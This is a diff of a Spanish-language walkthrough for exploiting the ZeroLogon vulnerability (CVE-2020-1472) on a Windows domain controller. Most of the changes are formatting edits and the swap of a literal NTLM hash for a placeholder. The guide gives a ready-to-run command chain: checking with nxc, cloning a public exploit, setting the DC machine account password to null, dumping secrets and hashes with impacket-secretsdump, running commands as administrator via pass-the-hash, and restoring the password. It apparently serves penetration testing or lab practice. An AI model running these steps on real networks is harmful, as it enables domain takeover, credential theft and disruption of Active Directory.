@@ -40,27 +40,32 @@ nxc smb [IP_DEL_DC]
 
 ```bash
 nxc smb [IP_DEL_DC] -u '' -p '' -M zerologon
-
-CHECKEAR esto y si es vulnerable.... lo siguiente
 ```
 
 Este módulo intenta autenticar usando claves nulas y explotar la vulnerabilidad en Netlogon.
+CHECKEAR esto y si es vulnerable.... lo siguiente
 
 ---
 
 ### 3. Clonar el exploit de VoidSec
 
+Clonar repositorio
 ```bash
 git clone https://github.com/VoidSec/CVE-2020-1472
 cd CVE-2020-1472
 ```
 
+Verificar si no debemos instalar algun requisito
+
+```bash
+pip install -r requirements.txt
+```
+
 ---
 
 ### 4. Cambiar la contraseña de la cuenta de equipo del DC
-
 ```bash
-python3 cve-2020-1472-exploit.py (para ver si no hay que instalar añgun requisito)
+python3 cve-2020-1472-exploit.py
 ```
 
 O usar argumentos manuales:
@@ -74,18 +79,19 @@ python3 cve-2020-1472-exploit.py -t [IP_DEL_DC] -n [NOMBRE_DEL_DC]
 ### 5. Volcar hashes con Impacket
 
 ```bash
-impacket-secretsdump '[NOMBRE_DEL_DOMINIO_AD]/[NOMBRE_DEL_DC]$@[IP_DEL_DC]'
+impacket-secretsdump '[[NOMBRE_DEL_DOMINIO]]/[NOMBRE_DEL_DC]$@[IP_DEL_DC]'
 ```
 
 Esto permite obtener los secretos de LSA y hash de administrador.
 
 ---
 
-### 6. Validar acceso como máquina y luego como administrador (Para dumpear hex de maquina para recuperar contraseña)
+### 6. Validar acceso como máquina y luego como administrador 
 
 ```bash
 nxc smb [IP_DEL_DC] -u '[NOMBRE_DEL_DC]$' -p '' --lsa
 ```
+Usamos el <pre>--lsa</pre> para dumpear HEX de maquina para recuperar contraseña
 
 Con hash de administrador (por ejemplo):
 
@@ -104,7 +110,7 @@ python3 reinstall_original_pw.py
 O con argumentos:
 
 ```bash
-python3 reinstall_original_pw.py [NOMBRE_DEL_DC]$ [IP_DEL_DC] [HEX DE CONTRASEÑA DEL DC]
+python3 reinstall_original_pw.py [NOMBRE_DEL_DC]$ [IP_DEL_DC] [HEX_DE_CONTRASEÑA_DEL_DC]
 ```
 
 ---
@@ -112,7 +118,7 @@ python3 reinstall_original_pw.py [NOMBRE_DEL_DC]$ [IP_DEL_DC] [HEX DE CONTRASEÑ
 ### 8. Validar acceso final con hash NTLM
 
 ```bash
-impacket-secretsdump '[NOMBRE_DEL_DOMINIO_AD]/[NOMBRE_DEL_DC]$@[IP_DEL_DC]'
+impacket-secretsdump '[[NOMBRE_DEL_DOMINIO]]/[NOMBRE_DEL_DC]$@[IP_DEL_DC]'
 ```
 
 ---
@@ -120,7 +126,7 @@ impacket-secretsdump '[NOMBRE_DEL_DOMINIO_AD]/[NOMBRE_DEL_DC]$@[IP_DEL_DC]'
 ### 9. Ejecutar comando remoto como administrador
 
 ```bash
-nxc smb [IP_DEL_DC] -u 'administrator' -H 'b8f81826afbf8feae22924970055d318' -x whoami
+nxc smb [IP_DEL_DC] -u 'administrator' -H '[HASH_DE_ADMINISTRADOR]' -x whoami
 ```
 
 ---
@@ -131,7 +137,7 @@ nxc smb [IP_DEL_DC] -u 'administrator' -H 'b8f81826afbf8feae22924970055d318' -x 
 - Reemplazamos la contraseña de la cuenta del DC con una contraseña nula.
 - Extraímos hashes y secretos del sistema.
 - Accedimos remotamente como administrador de dominio.
-- Finalmente restauramos el estado original (opcional).
+- Finalmente restauramos el estado original.
 
 ---
 
@@ -147,15 +153,12 @@ nxc smb [IP_DEL_DC] -u 'administrator' -H 'b8f81826afbf8feae22924970055d318' -x 
 ## 🚨 Advertencia
 
 ### Riesgo crítico: el AD puede romperse
-El exploit ZeroLogon cambia la contraseña de la cuenta de máquina del controlador de dominio (DC01$). Si no se restaura rápidamente, el controlador ya no podrá autenticarse ni replicarse con otros DCs.
+El exploit ZeroLogon cambia la contraseña de la cuenta de máquina del controlador de dominio. Si no se restaura rápidamente, el controlador ya no podrá autenticarse ni replicarse con otros DCs.
 
-Esto puede:
-
-Romper la replicación del Active Directory.
-
-Causar fallos en políticas, usuarios y servicios.
-
-Obligar a restaurar el dominio desde backups.
+**Esto puede:**
+- Romper la replicación del Active Directory.
+- Causar fallos en políticas, usuarios y servicios.
+- Obligar a restaurar el dominio desde backups.
 
 ### 🛑 Siempre restaurá la contraseña original del DC antes de que se sincronice con otros controladores.
 
